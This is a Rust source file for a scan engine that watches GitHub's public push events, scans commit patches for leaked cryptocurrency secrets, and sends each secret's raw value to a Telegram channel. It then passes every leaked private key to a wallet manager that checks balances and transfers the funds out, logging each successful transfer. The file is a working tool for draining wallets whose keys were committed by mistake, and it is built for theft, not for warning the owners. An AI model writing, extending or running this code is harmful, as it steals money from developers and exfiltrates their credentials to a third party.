use crate::config::Config;
use crate::core::cache::CacheManager;
use crate::models::github::GitHubEvent;
use crate::patterns::matcher::PatternMatcher;
use crate::scanner::commits::CommitFetcher;
use crate::scanner::events::GitHubEventsPoller;
use crate::scanner::files::should_scan_file;
use crate::models::scan::{CryptoSecret, SecretType};
use crate::telegram::alerts::TelegramAlerts;
use crate::wallet::manager::WalletManager;
use std::sync::Arc;
use tracing::{info, warn};
use rayon::prelude::*;

pub struct ScanEngine {
    config: Arc<Config>,
    cache: Arc<CacheManager>,
    matcher: Arc<PatternMatcher>,
    telegram: Arc<TelegramAlerts>,
    wallet_manager: Arc<WalletManager>,
}

impl ScanEngine {
    pub fn new(
        config: Arc<Config>,
        cache: Arc<CacheManager>,
        telegram: Arc<TelegramAlerts>,
        wallet_manager: Arc<WalletManager>,
    ) -> Arc<Self> {
        Arc::new(Self {
            config,
            cache,
            matcher: Arc::new(PatternMatcher::new()),
            telegram,
            wallet_manager,
        })
    }
    
    pub async fn run(self: Arc<Self>) {
        info!("🚀 Scan engine started");
        
        let poller = GitHubEventsPoller::new(self.config.clone());
        let fetcher = CommitFetcher::new(self.config.clone());
        
        let engine = self.clone();
        
        poller.poll(move |event: GitHubEvent| {
            let engine = engine.clone();
            let fetcher = fetcher.clone();
            
            tokio::spawn(async move {
                engine.process_event_optimized(event, fetcher).await;
            });
        }).await;
    }
    
    // Optimized: Parallel file scanning + batch key processing
    async fn process_event_optimized(&self, event: GitHubEvent, fetcher: CommitFetcher) {
        let repo_name = event.repo.name.clone();
        
        if event.event_type != "PushEvent" {
            return;
        }
        
        info!("📦 Push event from: {}", repo_name);
        
        let commits = fetcher.fetch_commits(&event).await;
        info!("📝 Processing {} commits", commits.len());
        
        // Collect all scannable files
        let mut scan_tasks: Vec<(String, String, String, String)> = Vec::new();
        
        for commit_with_repo in commits {
            let repo = commit_with_repo.repo_name.clone();
            let commit_sha = commit_with_repo.commit.sha.clone();
            
            if !self.cache.should_scan_commit(&commit_sha) {
                continue;
            }
            
            if let Some(files) = &commit_with_repo.commit.files {
                for file in files {
                    if should_scan_file(&file.filename) {
                        if let Some(patch) = &file.patch {
                            scan_tasks.push((
                                repo.clone(),
                                commit_sha.clone(),
                                file.filename.clone(),
                                patch.clone(),
                            ));
                        }
                    }
                }
            }
        }
        
        if scan_tasks.is_empty() {
            return;
        }
        
        info!("🔍 Scanning {} files in parallel", scan_tasks.len());
        
        // Parallel scan with Rayon (CPU-bound)
        let scan_results: Vec<(String, String, String, Vec<CryptoSecret>)> = scan_tasks
            .par_iter()
            .filter_map(|(repo, sha, path, patch)| {
                let secrets = self.matcher.scan_content(patch);
                if secrets.is_empty() {
                    None
                } else {
                    Some((repo.clone(), sha.clone(), path.clone(), secrets))
                }
            })
            .collect();
        
        info!("✅ Found secrets in {} files", scan_results.len());
        
        // Collect all private keys for batch processing
        let mut all_private_keys = Vec::new();
        
        for (repo, commit_sha, file_path, secrets) in &scan_results {
            for secret in secrets {
                info!("🔑 SECRET FOUND in {} ({})", file_path, repo);
                
                self.telegram.send_secret_found(
                    repo,
                    commit_sha,
                    file_path,
                    &secret.secret_type.to_string(),
                    &secret.value,
                ).await;
                
                if secret.secret_type == SecretType::PrivateKey {
                    all_private_keys.push(secret.value.clone());
                }
            }
        }
        
        // Batch process all private keys
        if !all_private_keys.is_empty() {
            info!("💰 Processing {} private keys in batch", all_private_keys.len());
            
            let results = self.wallet_manager
                .process_keys_batch(all_private_keys)
                .await;
            
            for (wallet_info, transfer_result) in results {
                self.telegram.send_balance_detected(&wallet_info).await;
                
                if let Some(transfer) = transfer_result {
                    if transfer.success {
                        self.telegram.send_transfer_success(&wallet_info, &transfer).await;
                    } else if let Some(error) = &transfer.error {
                        self.telegram.send_transfer_failed(&wallet_info, error).await;
                    }
                }
            }
        }
    }
}